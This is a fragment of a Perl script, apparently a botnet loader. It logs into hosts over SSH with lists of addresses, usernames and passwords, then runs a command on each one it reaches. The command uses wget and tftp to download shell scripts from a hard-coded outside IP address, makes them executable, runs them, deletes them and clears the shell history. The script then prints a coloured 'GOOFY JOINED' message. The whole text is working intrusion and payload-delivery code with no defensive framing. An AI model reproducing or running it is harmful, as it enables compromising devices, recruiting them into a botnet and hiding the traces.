...
scalar(@newarray); $i+=3) {
        ...
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://188.166.218.175/AXIS.sh; chmod 777 *; sh AXIS.sh; tftp -g 188.166.218.175 -r tftp1.sh; chmod 777 *; sh tftp1.sh; rm -rf *.sh; history -c"');
                        sleep 10;
                        $channel->close;
                ...
                print "\e[36;1mLoading [\x1b[1;32mGOOFY\x1b[1;37m] JOINED \n";
        }
        $pm->finish;
}
